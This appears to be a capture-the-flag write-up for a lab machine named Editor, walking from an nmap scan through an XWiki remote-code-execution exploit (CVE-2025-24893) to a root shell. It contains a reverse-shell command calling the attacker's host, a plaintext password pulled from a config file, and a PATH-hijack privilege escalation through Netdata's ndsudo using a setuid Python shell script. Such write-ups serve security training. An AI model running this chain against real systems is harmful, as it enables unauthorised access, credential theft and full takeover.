```
sudo nmap -vvv -Pn -sC -sCV --reason -T4 -p0-65535 -on Editor.nmap 10.129.207.9
```

```
PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:                                                                                                                                                    
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)  
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBJ+m7rYl1vRtnm789pH3IRhxI4CNCANVj+N5kovboNzcw9vHsBwvPX3KYA3cxGbKiA0VqbKRpOHnpsMuHEXEVJc=
|   256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOtuEdoYxTohG80Bo6YCqSzUY9+qbnAFnhsk4yAZNqhM
80/tcp   open  http    syn-ack ttl 63 nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://editor.htb/
| http-methods:                                    
|_  Supported Methods: GET HEAD POST OPTIONS
8080/tcp open  http    syn-ack ttl 63 Jetty 10.0.20            
| http-webdav-scan:            
|   Allowed Methods: OPTIONS, GET, HEAD, PROPFIND, LOCK, UNLOCK
|   Server Type: Jetty(10.0.20)     
|_  WebDAV type: Unknown          
|_http-server-header: Jetty(10.0.20)                                  
| http-title: XWiki - Main - Intro
|_Requested resource was http://10.129.207.9:8080/xwiki/bin/view/Main/
| http-cookie-flags:
|   /:                       
|     JSESSIONID:
|_      httponly flag not set                               
| http-methods:                                    
|   Supported Methods: OPTIONS GET HEAD PROPFIND LOCK UNLOCK
|_  Potentially risky methods: PROPFIND LOCK UNLOCK
|_http-open-proxy: Proxy might be redirecting requests
| http-robots.txt: 50 disallowed entries (40 shown)  
| /xwiki/bin/viewattachrev/ /xwiki/bin/viewrev/          
| /xwiki/bin/pdf/ /xwiki/bin/edit/ /xwiki/bin/create/                        
| /xwiki/bin/inline/ /xwiki/bin/preview/ /xwiki/bin/save/      
| /xwiki/bin/saveandcontinue/ /xwiki/bin/rollback/ /xwiki/bin/deleteversions/
| /xwiki/bin/cancel/ /xwiki/bin/delete/ /xwiki/bin/deletespace/     
| /xwiki/bin/undelete/ /xwiki/bin/reset/ /xwiki/bin/register/        
| /xwiki/bin/propupdate/ /xwiki/bin/propadd/ /xwiki/bin/propdisable/   
| /xwiki/bin/propenable/ /xwiki/bin/propdelete/ /xwiki/bin/objectadd/
| /xwiki/bin/commentadd/ /xwiki/bin/commentsave/ /xwiki/bin/objectsync/
| /xwiki/bin/objectremove/ /xwiki/bin/attach/ /xwiki/bin/upload/            
| /xwiki/bin/temp/ /xwiki/bin/downloadrev/ /xwiki/bin/dot/        
| /xwiki/bin/delattachment/ /xwiki/bin/skin/ /xwiki/bin/jsx/ /xwiki/bin/ssx/
| /xwiki/bin/login/ /xwiki/bin/loginsubmit/ /xwiki/bin/loginerror/
|_/xwiki/bin/logout/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

http://10.129.207.9:8080/xwiki/bin/view/Main/ - X wiki main page


http://editor.htb/ is a code editor. 

https://github.com/gunzf0x/CVE-2025-24893/blob/main/CVE-2025-24893.py
```
 python3 CVE-2025-24893.py -t 'http://editor.htb:8080' -c 'busybox nc 10.10.16.51 9001 -e /bin/bash'
```
gets us a shell as xwiki
hibernate.cfg.xml contains a password for oliver 

```
cat /etc/xwiki/hibernate.cfg.xml |grep -i password                                                                   
    <property name="hibernate.connection.password">theEd1t0rTeam99</property>                                          
    <property name="hibernate.connection.password">xwiki</property>                                                    
    <property name="hibernate.connection.password">xwiki</property>                                                  
    <property name="hibernate.connection.password"></property>                                                        
    <property name="hibernate.connection.password">xwiki</property>                                                  
    <property name="hibernate.connection.password">xwiki</property>                                                  
    <property name="hibernate.connection.password"></property> 
```


find / -perm -4000 -type f 2>/dev/null
```
/opt/netdata/usr/libexec/netdata/plugins.d/cgroup-network
/opt/netdata/usr/libexec/netdata/plugins.d/network-viewer.plugin
/opt/netdata/usr/libexec/netdata/plugins.d/local-listeners
**/opt/netdata/usr/libexec/netdata/plugins.d/ndsudo**
/opt/netdata/usr/libexec/netdata/plugins.d/ioping
/opt/netdata/usr/libexec/netdata/plugins.d/nfacct.plugin
/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.plugin
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/su
/usr/bin/umount
/usr/bin/chsh
/usr/bin/fusermount3
/usr/bin/sudo
/usr/bin/passwd
/usr/bin/mount
/usr/bin/chfn
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/libexec/polkit-agent-helper-1

```

https://github.com/netdata/netdata/security/advisories/GHSA-pmhq-4cxq-wj93

takes advantage of /opt/netdata/usr/libexec/netdata/plugins.d/ndsudo**

we use megacli a ndsudo command 

export PATH=~/fakebin:$PATH sets our path variable to this value

```python
#!/usr/bin/python3
import os

# Set UID and GID to 0 (root)
os.setgid(0)
os.setuid(0)

# Replace current process with an interactive bash shell
os.execv("/bin/bash", ["bash", "-i"])

```
This python script sets our guid and suid to root - 0 

and spawns a shell 

/opt/netdata/usr/libexec/netdata/plugins.d/ndsudo megacli-disk-info runs the command 

which finds the megacli executable 

and gives us root.

```
root@editor:/# find / -name "root.txt"                                                                                                                                                                                                     
/root/root.txt                                                                                                                                                                                                                             
root@editor:/# cd root/                                                                                                                                                                                                                    
root@editor:/root# ls                                                                                                                                                                                                                      
root.txt  scripts  snap                                                                                                                                                                                                                    
root@editor:/root# cat root.txt
```

Solved!!! 
